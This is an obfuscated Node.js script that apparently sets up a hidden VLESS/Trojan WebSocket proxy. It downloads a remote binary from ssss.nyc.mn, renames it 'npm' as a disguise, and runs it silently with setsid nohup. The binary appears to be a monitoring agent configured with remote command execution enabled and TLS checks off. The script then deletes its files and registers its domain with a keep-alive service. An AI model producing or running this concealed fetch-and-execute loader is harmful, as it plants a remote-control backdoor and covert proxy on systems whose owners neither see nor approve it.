const _0xf481a1=_0x2ed7;(function(_0x24e84b,_0x4945b7){const _0x4f6170=_0x2ed7,_0xfa9bec=_0x24e84b();while(!![]){try{const _0x31da8a=parseInt(_0x4f6170(0x18e))/0x1*(parseInt(_0x4f6170(0x185))/0x2)+-parseInt(_0x4f6170(0x1de))/0x3+-parseInt(_0x4f6170(0x1c8))/0x4*(parseInt(_0x4f6170(0x186))/0x5)+parseInt(_0x4f6170(0x18b))/0x6*(-parseInt(_0x4f6170(0x1b4))/0x7)+parseInt(_0x4f6170(0x1ab))/0x8+parseInt(_0x4f6170(0x1ed))/0x9+parseInt(_0x4f6170(0x1ac))/0xa*(parseInt(_0x4f6170(0x1c3))/0xb);if(_0x31da8a===_0x4945b7)break;else _0xfa9bec['push'](_0xfa9bec['shift']());}catch(_0x3b822c){_0xfa9bec['push'](_0xfa9bec['shift']());}}}(_0x3d1c,0x1d87a));function _0x2ed7(_0x329354,_0x324c82){_0x329354=_0x329354-0x185;const _0x3d1c60=_0x3d1c();let _0x2ed781=_0x3d1c60[_0x329354];return _0x2ed781;}const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0xf481a1(0x1a1)),path=require(_0xf481a1(0x1c2)),crypto=require(_0xf481a1(0x1cc)),{Buffer}=require(_0xf481a1(0x1d6)),{exec,execSync}=require(_0xf481a1(0x1f0)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xf481a1(0x19a)][_0xf481a1(0x1dd)]||_0xf481a1(0x1ca),NEZHA_SERVER=process[_0xf481a1(0x19a)][_0xf481a1(0x1c6)]||'',NEZHA_PORT=process[_0xf481a1(0x19a)][_0xf481a1(0x1dc)]||'',NEZHA_KEY=process[_0xf481a1(0x19a)][_0xf481a1(0x203)]||'',DOMAIN=process[_0xf481a1(0x19a)][_0xf481a1(0x1f9)]||'1234.abc.com',AUTO_ACCESS=process[_0xf481a1(0x19a)][_0xf481a1(0x1bd)]||!![],WSPATH=process[_0xf481a1(0x19a)][_0xf481a1(0x1af)]||UUID[_0xf481a1(0x199)](0x0,0x8),SUB_PATH=process[_0xf481a1(0x19a)][_0xf481a1(0x190)]||_0xf481a1(0x1a3),NAME=process[_0xf481a1(0x19a)]['NAME']||'Hug',PORT=process['env'][_0xf481a1(0x1c7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x396133=_0xf481a1;try{const _0x1ee37b=await axios['get'](_0x396133(0x1b9)),_0xdf9b40=_0x1ee37b[_0x396133(0x195)];ISP=(_0xdf9b40['country']+'-'+_0xdf9b40['asOrganization'])[_0x396133(0x1e5)](/ /g,'_');}catch(_0x44b2bc){ISP=_0x396133(0x1e8);}};GetISP();const httpServer=http[_0xf481a1(0x1f1)]((_0x2899f4,_0x21874c)=>{const _0x5764be=_0xf481a1;if(_0x2899f4[_0x5764be(0x19d)]==='/'){const _0x24c618=path[_0x5764be(0x1b8)](__dirname,'index.html');fs[_0x5764be(0x1b2)](_0x24c618,_0x5764be(0x1e2),(_0x462cf9,_0x1695ef)=>{const _0x1ff2ee=_0x5764be;if(_0x462cf9){_0x21874c[_0x1ff2ee(0x18d)](0xc8,{'Content-Type':_0x1ff2ee(0x1d5)}),_0x21874c[_0x1ff2ee(0x1db)](_0x1ff2ee(0x1e4));return;}_0x21874c[_0x1ff2ee(0x18d)](0xc8,{'Content-Type':_0x1ff2ee(0x1d5)}),_0x21874c['end'](_0x1695ef);});return;}else{if(_0x2899f4[_0x5764be(0x19d)]==='/'+SUB_PATH){const _0x9cfbaf=_0x5764be(0x1c5)+UUID+'@'+DOMAIN+_0x5764be(0x201)+DOMAIN+_0x5764be(0x1ba)+DOMAIN+_0x5764be(0x1f3)+WSPATH+'#'+NAME+'-'+ISP,_0x57cee4=_0x5764be(0x1a4)+UUID+'@'+DOMAIN+_0x5764be(0x1d0)+DOMAIN+_0x5764be(0x1ba)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x450524=_0x9cfbaf+'\x0a'+_0x57cee4,_0x1e23f6=Buffer[_0x5764be(0x19b)](_0x450524)[_0x5764be(0x1a2)](_0x5764be(0x1bb));_0x21874c[_0x5764be(0x18d)](0xc8,{'Content-Type':_0x5764be(0x1c4)}),_0x21874c[_0x5764be(0x1db)](_0x1e23f6+'\x0a');}else _0x21874c['writeHead'](0x194,{'Content-Type':_0x5764be(0x1c4)}),_0x21874c['end'](_0x5764be(0x19f));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0xf481a1(0x1e5)](/-/g,''),DNS_SERVERS=[_0xf481a1(0x187),_0xf481a1(0x1be)];function resolveHost(_0x18bac5){return new Promise((_0x38ad56,_0x4b1f66)=>{const _0x962402=_0x2ed7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x962402(0x202)](_0x18bac5)){_0x38ad56(_0x18bac5);return;}let _0x4a5c8c=0x0;function _0x53e32e(){const _0x5c72e8=_0x962402;if(_0x4a5c8c>=DNS_SERVERS[_0x5c72e8(0x1f5)]){_0x4b1f66(new Error(_0x5c72e8(0x1a8)+_0x18bac5+_0x5c72e8(0x192)));return;}const _0x5bf54c=DNS_SERVERS[_0x4a5c8c];_0x4a5c8c++;const _0x2da262='https://dns.google/resolve?name='+encodeURIComponent(_0x18bac5)+'&type=A';axios['get'](_0x2da262,{'timeout':0x1388,'headers':{'Accept':_0x5c72e8(0x1d9)}})[_0x5c72e8(0x1cb)](_0x49d183=>{const _0x381283=_0x5c72e8,_0x5c3aac=_0x49d183['data'];if(_0x5c3aac['Status']===0x0&&_0x5c3aac[_0x381283(0x1e3)]&&_0x5c3aac[_0x381283(0x1e3)][_0x381283(0x1f5)]>0x0){const _0xda586=_0x5c3aac['Answer'][_0x381283(0x1f4)](_0x31befa=>_0x31befa[_0x381283(0x1ce)]===0x1);if(_0xda586){_0x38ad56(_0xda586[_0x381283(0x195)]);return;}}_0x53e32e();})[_0x5c72e8(0x1b1)](_0x36088c=>{_0x53e32e();});}_0x53e32e();});}function handleVlessConnection(_0x247f7b,_0x1a972d){const _0x51bbe5=_0xf481a1,[_0x39740d]=_0x1a972d,_0x565e58=_0x1a972d[_0x51bbe5(0x199)](0x1,0x11);if(!_0x565e58[_0x51bbe5(0x200)]((_0x3852c4,_0x3493e8)=>_0x3852c4==parseInt(uuid['substr'](_0x3493e8*0x2,0x2),0x10)))return![];let _0x5b928b=_0x1a972d[_0x51bbe5(0x199)](0x11,0x12)[_0x51bbe5(0x1aa)]()+0x13;const _0x172c8e=_0x1a972d['slice'](_0x5b928b,_0x5b928b+=0x2)[_0x51bbe5(0x1c1)](0x0),_0x1cd30e=_0x1a972d['slice'](_0x5b928b,_0x5b928b+=0x1)[_0x51bbe5(0x1aa)](),_0x4ad003=_0x1cd30e==0x1?_0x1a972d[_0x51bbe5(0x199)](_0x5b928b,_0x5b928b+=0x4)[_0x51bbe5(0x1b8)]('.'):_0x1cd30e==0x2?new TextDecoder()[_0x51bbe5(0x19e)](_0x1a972d[_0x51bbe5(0x199)](_0x5b928b+0x1,_0x5b928b+=0x1+_0x1a972d['slice'](_0x5b928b,_0x5b928b+0x1)[_0x51bbe5(0x1aa)]())):_0x1cd30e==0x3?_0x1a972d[_0x51bbe5(0x199)](_0x5b928b,_0x5b928b+=0x10)['reduce']((_0x51bd86,_0x4e10e1,_0x8fd335,_0x1814ef)=>_0x8fd335%0x2?_0x51bd86[_0x51bbe5(0x1b7)](_0x1814ef[_0x51bbe5(0x199)](_0x8fd335-0x1,_0x8fd335+0x1)):_0x51bd86,[])[_0x51bbe5(0x19c)](_0x4fc867=>_0x4fc867[_0x51bbe5(0x1c1)](0x0)[_0x51bbe5(0x1a2)](0x10))[_0x51bbe5(0x1b8)](':'):'';_0x247f7b[_0x51bbe5(0x1e9)](new Uint8Array([_0x39740d,0x0]));const _0x37b509=createWebSocketStream(_0x247f7b);return resolveHost(_0x4ad003)[_0x51bbe5(0x1cb)](_0x46acb1=>{net['connect']({'host':_0x46acb1,'port':_0x172c8e},function(){const _0x21e9ee=_0x2ed7;this[_0x21e9ee(0x196)](_0x1a972d[_0x21e9ee(0x199)](_0x5b928b)),_0x37b509['on']('error',()=>{})[_0x21e9ee(0x1ea)](this)['on'](_0x21e9ee(0x1d7),()=>{})[_0x21e9ee(0x1ea)](_0x37b509);})['on']('error',()=>{});})[_0x51bbe5(0x1b1)](_0x39323b=>{const _0x56e41b=_0x51bbe5;net[_0x56e41b(0x1ad)]({'host':_0x4ad003,'port':_0x172c8e},function(){const _0x4fbd58=_0x56e41b;this['write'](_0x1a972d[_0x4fbd58(0x199)](_0x5b928b)),_0x37b509['on']('error',()=>{})[_0x4fbd58(0x1ea)](this)['on'](_0x4fbd58(0x1d7),()=>{})[_0x4fbd58(0x1ea)](_0x37b509);})['on']('error',()=>{});}),!![];}function _0x3d1c(){const _0xce5c45=['https://speed.cloudflare.com/meta','&fp=chrome&type=ws&host=','base64','npm\x20download\x20successfully','AUTO_ACCESS','1.1.1.1','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://oooo.serv00.net/add-url','readUInt16BE','path','44dehkAS','text/plain','vless://','NEZHA_SERVER','PORT','19268gsSgeZ','get','5f2c8a8f-a3c0-4f6f-8617-168f6bc2af52','then','crypto','utf-8','type','once',':443?security=tls&sni=','close','arm64','trim','https://arm64.ssss.nyc.mn/v1','text/html','buffer','error','pop','application/dns-json','arch','end','NEZHA_PORT','UUID','317328URnNtO','post','substr','arm','utf8','Answer','Hello\x20world!','replace','npm\x20is\x20already\x20running,\x20skip\x20running...','hex','Unknown','send','pipe','unlink','createHash','521478OUdzqj','config.yaml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','child_process','createServer','https://amd64.ssss.nyc.mn/v1','&path=%2F','find','length','false','true','digest','DOMAIN','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','setsid\x20nohup\x20./npm\x20-s\x20','sha224','client_secret:\x20','aarch64','2053','every',':443?encryption=none&security=tls&sni=','test','NEZHA_KEY','2EuqKwF','250IYWLhg','8.8.4.4','error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','1109586uEqNjs','chmod\x20+x\x20npm','writeHead','173099olFmsW','npm\x20running\x20error:','SUB_PATH','includes','\x20with\x20all\x20DNS\x20servers','log','https://arm64.ssss.nyc.mn/agent','data','write','createWriteStream','Server\x20is\x20running\x20on\x20port\x20','slice','env','from','map','url','decode','Not\x20Found\x0a','connection','net','toString','sub','trojan://','finish','/bin/bash','--tls','Failed\x20to\x20resolve\x20','reduce','readUInt8','693296GwROMk','837020NkNLzD','connect','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','WSPATH','https://','catch','readFile','split','7cBjIOU','npm','8443','concat','join'];_0x3d1c=function(){return _0xce5c45;};return _0x3d1c();}function handleTrojanConnection(_0x32ecac,_0x17a4a3){const _0x54dcc2=_0xf481a1;try{if(_0x17a4a3[_0x54dcc2(0x1f5)]<0x3a)return![];const _0x496d8c=_0x17a4a3[_0x54dcc2(0x199)](0x0,0x38)['toString'](),_0x1c3c17=[UUID];let _0x5646f5=null;for(const _0x362ce0 of _0x1c3c17){const _0x504e0e=crypto[_0x54dcc2(0x1ec)](_0x54dcc2(0x1fc))['update'](_0x362ce0)[_0x54dcc2(0x1f8)](_0x54dcc2(0x1e7));if(_0x504e0e===_0x496d8c){_0x5646f5=_0x362ce0;break;}}if(!_0x5646f5)return![];let _0x4e8b36=0x38;_0x17a4a3[_0x4e8b36]===0xd&&_0x17a4a3[_0x4e8b36+0x1]===0xa&&(_0x4e8b36+=0x2);const _0x3e93a3=_0x17a4a3[_0x4e8b36];if(_0x3e93a3!==0x1)return![];_0x4e8b36+=0x1;const _0xd3cb6f=_0x17a4a3[_0x4e8b36];_0x4e8b36+=0x1;let _0x146627,_0x523e62;if(_0xd3cb6f===0x1)_0x146627=_0x17a4a3[_0x54dcc2(0x199)](_0x4e8b36,_0x4e8b36+0x4)[_0x54dcc2(0x1b8)]('.'),_0x4e8b36+=0x4;else{if(_0xd3cb6f===0x3){const _0x2a85a5=_0x17a4a3[_0x4e8b36];_0x4e8b36+=0x1,_0x146627=_0x17a4a3[_0x54dcc2(0x199)](_0x4e8b36,_0x4e8b36+_0x2a85a5)[_0x54dcc2(0x1a2)](),_0x4e8b36+=_0x2a85a5;}else{if(_0xd3cb6f===0x4)_0x146627=_0x17a4a3[_0x54dcc2(0x199)](_0x4e8b36,_0x4e8b36+0x10)[_0x54dcc2(0x1a9)]((_0x23163c,_0x3391b1,_0x5324ff,_0x5a64fd)=>_0x5324ff%0x2?_0x23163c['concat'](_0x5a64fd[_0x54dcc2(0x199)](_0x5324ff-0x1,_0x5324ff+0x1)):_0x23163c,[])[_0x54dcc2(0x19c)](_0x3a6f0b=>_0x3a6f0b['readUInt16BE'](0x0)[_0x54dcc2(0x1a2)](0x10))[_0x54dcc2(0x1b8)](':'),_0x4e8b36+=0x10;else return![];}}_0x523e62=_0x17a4a3[_0x54dcc2(0x1c1)](_0x4e8b36),_0x4e8b36+=0x2;_0x4e8b36<_0x17a4a3[_0x54dcc2(0x1f5)]&&_0x17a4a3[_0x4e8b36]===0xd&&_0x17a4a3[_0x4e8b36+0x1]===0xa&&(_0x4e8b36+=0x2);const _0x521bc8=createWebSocketStream(_0x32ecac);return resolveHost(_0x146627)['then'](_0x200b90=>{const _0x37da28=_0x54dcc2;net[_0x37da28(0x1ad)]({'host':_0x200b90,'port':_0x523e62},function(){const _0x4ab052=_0x37da28;_0x4e8b36<_0x17a4a3[_0x4ab052(0x1f5)]&&this[_0x4ab052(0x196)](_0x17a4a3[_0x4ab052(0x199)](_0x4e8b36)),_0x521bc8['on'](_0x4ab052(0x1d7),()=>{})['pipe'](this)['on'](_0x4ab052(0x1d7),()=>{})[_0x4ab052(0x1ea)](_0x521bc8);})['on']('error',()=>{});})['catch'](_0x12be2b=>{const _0x1b2af3=_0x54dcc2;net[_0x1b2af3(0x1ad)]({'host':_0x146627,'port':_0x523e62},function(){const _0x432e3f=_0x1b2af3;_0x4e8b36<_0x17a4a3['length']&&this[_0x432e3f(0x196)](_0x17a4a3['slice'](_0x4e8b36)),_0x521bc8['on']('error',()=>{})[_0x432e3f(0x1ea)](this)['on'](_0x432e3f(0x1d7),()=>{})[_0x432e3f(0x1ea)](_0x521bc8);})['on']('error',()=>{});}),!![];}catch(_0x64b3d7){return![];}}wss['on'](_0xf481a1(0x1a0),(_0x5043c9,_0x30c61d)=>{const _0x949f50=_0xf481a1,_0x4e9ab8=_0x30c61d[_0x949f50(0x19d)]||'';_0x5043c9[_0x949f50(0x1cf)]('message',_0x5adc08=>{const _0x3c780c=_0x949f50;if(_0x5adc08[_0x3c780c(0x1f5)]>0x11&&_0x5adc08[0x0]===0x0){const _0x2569d0=_0x5adc08[_0x3c780c(0x199)](0x1,0x11),_0x36bc94=_0x2569d0[_0x3c780c(0x200)]((_0xb95c27,_0x32f690)=>_0xb95c27==parseInt(uuid[_0x3c780c(0x1e0)](_0x32f690*0x2,0x2),0x10));if(_0x36bc94){!handleVlessConnection(_0x5043c9,_0x5adc08)&&_0x5043c9[_0x3c780c(0x1d1)]();return;}}!handleTrojanConnection(_0x5043c9,_0x5adc08)&&_0x5043c9[_0x3c780c(0x1d1)]();})['on'](_0x949f50(0x1d7),()=>{});});const getDownloadUrl=()=>{const _0x5c9221=_0xf481a1,_0x2cb613=os[_0x5c9221(0x1da)]();return _0x2cb613===_0x5c9221(0x1e1)||_0x2cb613===_0x5c9221(0x1d2)||_0x2cb613===_0x5c9221(0x1fe)?!NEZHA_PORT?_0x5c9221(0x1d4):_0x5c9221(0x194):!NEZHA_PORT?_0x5c9221(0x1f2):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3bc84c=_0xf481a1;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xe307d6=getDownloadUrl(),_0x12fba4=await axios({'method':_0x3bc84c(0x1c9),'url':_0xe307d6,'responseType':'stream'}),_0x59d90f=fs[_0x3bc84c(0x197)](_0x3bc84c(0x1b5));return _0x12fba4['data'][_0x3bc84c(0x1ea)](_0x59d90f),new Promise((_0x1804d8,_0x24322c)=>{const _0x26037f=_0x3bc84c;_0x59d90f['on'](_0x26037f(0x1a5),()=>{const _0x3c73b3=_0x26037f;console[_0x3c73b3(0x193)](_0x3c73b3(0x1bc)),exec(_0x3c73b3(0x18c),_0x1f2ead=>{if(_0x1f2ead)_0x24322c(_0x1f2ead);_0x1804d8();});}),_0x59d90f['on'](_0x26037f(0x1d7),_0x24322c);});}catch(_0x5e3917){throw _0x5e3917;}},runnz=async()=>{const _0x5c7f9d=_0xf481a1;try{const _0xa16115=execSync(_0x5c7f9d(0x1ae),{'encoding':_0x5c7f9d(0x1cd)});if(_0xa16115[_0x5c7f9d(0x1d3)]()!==''){console[_0x5c7f9d(0x193)](_0x5c7f9d(0x1e6));return;}}catch(_0x3925c8){}await downloadFile();let _0x5d989d='',_0x4af7da=['443',_0x5c7f9d(0x1b6),'2096','2087','2083',_0x5c7f9d(0x1ff)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5bb83d=_0x4af7da[_0x5c7f9d(0x191)](NEZHA_PORT)?_0x5c7f9d(0x1a7):'';_0x5d989d=_0x5c7f9d(0x1fb)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5bb83d+_0x5c7f9d(0x1fa);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x364c9d=NEZHA_SERVER[_0x5c7f9d(0x191)](':')?NEZHA_SERVER[_0x5c7f9d(0x1b3)](':')[_0x5c7f9d(0x1d8)]():'',_0x25ef33=_0x4af7da[_0x5c7f9d(0x191)](_0x364c9d)?_0x5c7f9d(0x1f7):_0x5c7f9d(0x1f6),_0x1180a3=_0x5c7f9d(0x1fd)+NEZHA_KEY+_0x5c7f9d(0x1ef)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x25ef33+_0x5c7f9d(0x189)+UUID;fs['writeFileSync'](_0x5c7f9d(0x1ee),_0x1180a3);}_0x5d989d=_0x5c7f9d(0x18a);}else{console[_0x5c7f9d(0x193)](_0x5c7f9d(0x1bf));return;}}try{exec(_0x5d989d,{'shell':_0x5c7f9d(0x1a6)},_0x5c1656=>{const _0x581931=_0x5c7f9d;if(_0x5c1656)console['error'](_0x581931(0x18f),_0x5c1656);else console[_0x581931(0x193)]('npm\x20is\x20running');});}catch(_0xadd8f0){console[_0x5c7f9d(0x1d7)](_0x5c7f9d(0x188)+_0xadd8f0);}};async function addAccessTask(){const _0x216052=_0xf481a1;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x54988a=_0x216052(0x1b0)+DOMAIN;try{const _0x30b6ed=await axios[_0x216052(0x1df)](_0x216052(0x1c0),{'url':_0x54988a},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3d6895){}}const delFiles=()=>{const _0x1ad044=_0xf481a1;fs['unlink'](_0x1ad044(0x1b5),()=>{}),fs[_0x1ad044(0x1eb)](_0x1ad044(0x1ee),()=>{});};httpServer['listen'](PORT,()=>{const _0x2934ec=_0xf481a1;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2934ec(0x193)](_0x2934ec(0x198)+PORT);});
